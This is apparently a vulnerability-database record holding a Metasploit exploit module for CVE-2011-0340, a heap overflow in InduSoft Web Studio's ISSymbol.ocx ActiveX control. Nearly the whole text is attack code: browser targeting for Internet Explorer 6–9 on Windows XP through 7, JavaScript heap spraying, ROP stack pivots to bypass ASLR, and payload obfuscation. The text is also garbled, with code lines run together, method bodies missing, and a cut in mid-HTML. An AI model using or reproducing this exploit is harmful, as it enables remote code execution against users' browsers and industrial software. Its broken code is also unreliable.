{
    "text": "vul_name : InduSoft Web Studio ISSymbol.ocx InternationalSeparator (  ) Heap Overflow ， vul_cve : CVE-2011-0340 ， vul_poc :  ，  # This file is part of the Metasploit Framework and may be subject to ，  # redistribution and commercial restrictions. Please see the Metasploit ，  # Framework web site for more information on licensing and terms of use. ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = NormalRanking ， include Msf : Exploit : Remote : HttpServer : HTML ， include Msf : Exploit : RopDb ， include Msf : Exploit : Remote : BrowserAutopwn ， autopwn_info ( { ，  : ua_name => HttpClients : IE ,  ，  : ua_minver => \"6.0\" ,  ，  : ua_maxver => \"9.0\" ,  ，  : javascript => true ,  ，  : os_name => OperatingSystems : WINDOWS ,  ，  : rank => NormalRanking ,  ，  : classid => \"{3c9dff6f-5cb0-422e-9978-d6405d10718f}\" ,  ，  : method => \"InternationalSeparator\" ， } )  ， super ( update_info ( info ,  ， 'Name' => \"InduSoft Web Studio ISSymbol.ocx InternationalSeparator (  ) Heap Overflow\" ,  ， 'Description' => %q{ ， This module exploits a heap overflow found in InduSoft Web Studio <= 61.6.00.00 ， SP6. The overflow exists in the ISSymbol.ocx , and can be triggered with a long ， string argument for the InternationalSeparator (  ) method of the ISSymbol control. ， This modules uses the msvcr71.dll form the Java JRE6 to bypass ASLR. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Alexander Gavrun' ,  # Vulnerability discovery ， 'Dmitriy Pletnev' ,  # Vulnerability discovery ， 'James Fitts' ,  # Metasploit module ， 'juan vazquez' # Metasploit module ，  ]  ,  ， ' ，  [  ，  [ 'CVE' , '2011-0340' ]  ,  ，  [ 'OSVDB' , '72865' ]  ,  ，  [ 'BID' , '47596' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'Payload' => ， { ， 'Space' => 934 ,  ， 'DisableNops' => true ,  ， 'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp , -3500 ， } ,  ， 'DefaultOptions' => ， { ， 'InitialAutoRunScript' => 'migrate -f' ， } ,  ， 'Platform' => 'win' ,  ， 'Targets' => ，  [  ，  [ 'Automatic' , {} ]  ,  ，  [ 'IE 6 on Windows XP SP3' , { 'Rop' => nil , 'Offset' => '0x5F4' } ]  ,  ，  [ 'IE 7 on Windows XP SP3' , { 'Rop' => nil , 'Offset' => '0x5F4' } ]  ,  ，  [ 'IE 8 on Windows XP SP3' , { 'Rop' => : msvcrt , 'Offset' => '0x5f4' } ]  ,  ，  [ 'IE 7 on Windows Vista' , { 'Rop' => nil , 'Offset' => '0x5f4' } ]  ,  ，  [ 'IE 8 on Windows Vista' , { 'Rop' => : jre , 'Offset' => '0x5f4' } ]  ,  ，  [ 'IE 8 on Windows 7' , { 'Rop' => : jre , 'Offset' => '0x5f4' } ]  ,  ，  [ 'IE 9 on Windows 7' , { 'Rop' => : jre , 'Offset' => '0x5fe' } ]  ，  ]  ,  ， 'Privileged' => false ,  ， 'DisclosureDate' => \"Apr 28 2012\" ,  ， 'DefaultTarget' => 0 )  ， register_options (  ，  [  ， OptBool.new ( 'OBFUSCATE' ,  [ false , 'Enable JavaScript obfuscation' , false ]  )  ，  ]  , self.class )  ， end ，  # If the user is already specified by the user , we'll just use that ， nt = agent.scan ( /Windows NT ( \\d\\.\\d ) / ) .flatten [ 0 ]  | ' ， ie = agent.scan ( /MSIE ( \\d ) / ) .flatten [ 0 ]  | ' ， ie_name = \"IE # {ie}\" ， case nt ， when '5.1' ， os_name = 'Windows XP SP3' ， when '6.0' ， os_name = 'Windows Vista' ， when '6.1' ， os_name = 'Windows 7' ， end ， targets.each do | t |  ， print_status ( \"Target selected as :  # {t.name}\" )  ， end ， end ， end ， js_code = Rex : Text.to_unescape ( p , Rex : Arch.endian ( target.arch )  ， js_nops = Rex : Text.to_unescape ( \"\\x0c\" * 4 , Rex : Arch.endian ( target.arch )  ， js_random_nops = Rex : Text.to_unescape ( make_nops ( 4 )  , Rex : Arch.endian ( my_target.arch )  ，  # Land the payload at 0x0c0c0c0c ， case my_target ， when targets [ 7 ]  ，  # IE 9 on Windows 7 ， js = %Q |  ， { ， var theblock = \" ;  ， { ， theblock += Math.floor ( Math.random (  )  * 90 ) +10 ;  ， } ， } ， { ， var blocklen = block.length ;  ， var unescapestr = \" ;  ， { ， unescapestr += \"%u\" + block.substring ( i , i+4 )  ;  ， } ， } ， var heap_obj = new heapLib.ie ( 0x10000 )  ;  ， var code = unescape ( \" # {js_code}\" )  ;  ， var nops = unescape ( \" # {js_random_nops}\" )  ;  ， var offset_length = # {my_target [ 'Offset' ] } ;  ， var padding = unescape ( tounescape ( randomblock ( 0x1000 )  ;  ， var junk_offset = padding.substring ( 0 , offset_length )  ;  ， var single_sprayblock = junk_offset + code + nops.substring ( 0 , 0x800 - code.length - junk_offset.length )  ;  ， sprayblock = single_sprayblock.substring ( 0 ,  ( 0x40000-6 ) /2 )  ;  ， heap_obj.alloc ( sprayblock )  ;  ， } ，  # For IE 6 , 7 , 8 ， js = %Q |  ， var heap_obj = new heapLib.ie ( 0x20000 )  ;  ， var code = unescape ( \" # {js_code}\" )  ;  ， var nops = unescape ( \" # {js_nops}\" )  ;  ， var offset = nops.substring ( 0 ,  # {my_target [ 'Offset' ] } )  ;  ， var shellcode = offset + code + nops.substring ( 0 , 0x800-code.length-offset.length )  ;  ， var block = shellcode.substring ( 0 ,  ( 0x80000-6 ) /2 )  ;  ， heap_obj.gc (  )  ;  ， heap_obj.alloc ( block )  ;  ， } ， var overflow = nops.substring ( 0 , 10 )  ;  ， end ， js = heaplib ( js , { : noobfu => true} )  ， js = : Rex : Exploitation : JSObfu.new ( js )  ， js.obfuscate ， end ， end ， code = payload.encoded ，  # No rop. Just return the payload. ， prepend = [  ， 0x0c0c0c0c ,  ， 0x0c0c0c0c ,  ， 0x0c0c0c0c ,  ， 0x0c0c0c0c ,  ， 0x0c0c0c0c ,  ， 0x0c0c0c0c ,  ， 0x0c0c0c28 # Will finally become EIP ，  ] .pack ( \"V * \" )  ， end ，  # Both ROP chains generated by mona.py - See corelan.be ， case t [ 'Rop' ]  ， when : msvcrt ， print_status ( \"Using msvcrt ROP\" )  ， stack_pivot = [  ， 0x0c0c0c0c ,  # ret from msvcrt.dll ， 0x77c15ed6 ,  # ret from msvcrt.dll ， 0x77c15ed6 ,  # ret from msvcrt.dll ， 0x77c15ed6 ,  # ret from msvcrt.dll ， 0x77c15ed6 ,  # ret from msvcrt.dll ， 0x77c1f519 ,  # pop # ret from msvcrt.dll ， 0x77c4fa1a # will become eip # mov esp , ebx # pop ebx # ret from msvcrt.dll ，  ] .pack ( \"V * \" )  ， rop_payload = generate_rop_payload ( 'msvcrt' , code , {'pivot'=>stack_pivot , 'target'=>'xp'} )  ， print_status ( \"Using JRE ROP\" )  ， stack_pivot = [  ， 0x0c0c0c0c ,  # ret from msvcr71.dll ， 0x7c376fff ,  # ret from msvcr71.dll ， 0x7c376fff ,  # ret from msvcr71.dll ， 0x7c376fff ,  # ret from msvcr71.dll ， 0x7c376fff ,  # ret from msvcr71.dll ， 0x7c376ffe ,  # pop # ret from msvcr71.dll ， 0x7c376ffc # will become eip # mov esp , ebx # pop ebx # ret from msvcr71.dll ，  ] .pack ( \"V * \" )  ， rop_payload = generate_rop_payload ( 'java' , code , {'pivot'=>stack_pivot} )  ， end ， end ， p = get_payload ( my_target , cli )  ， js = ie_heap_spray ( my_target , p )  ，  # ActiveX parameters ， clsid = \"3c9dff6f-5cb0-422e-9978-d6405d10718f\" ， name = rand_text_alpha ( rand ( 50 ) + 1 )  ， boom = Rex : Text.to_unescape ( \"\\x0c\" * 6888 )  ， html = %Q | ",
    "time": "2012.12.21"
}